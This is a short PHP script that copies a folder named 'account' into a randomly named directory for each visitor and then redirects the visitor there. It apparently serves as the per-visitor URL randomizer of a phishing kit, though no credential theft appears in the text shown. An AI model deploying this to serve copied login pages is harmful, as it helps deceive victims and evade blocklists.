<?php
$A = rand(1000000000, 1000000000000) . $_SERVER['REMOTE_ADDR'];
$B = substr(md5($A), 0, 10);
function recurse_copy($C, $B)
{
    $E = opendir($C);
    @mkdir($B);
    while (false !== ($D = readdir($E))) {
        if (($D != '.') && ($D != '..')) {
            if (is_dir($C . '/' . $D)) {
                recurse_copy($C . '/' . $D, $B . '/' . $D);
            } else {
                copy($C . '/' . $D, $B . '/' . $D);
            }
        }
    }
    closedir($E);
}
$C = "account";
recurse_copy($C, $B);
header("location:" . $B . "");
exit;
?>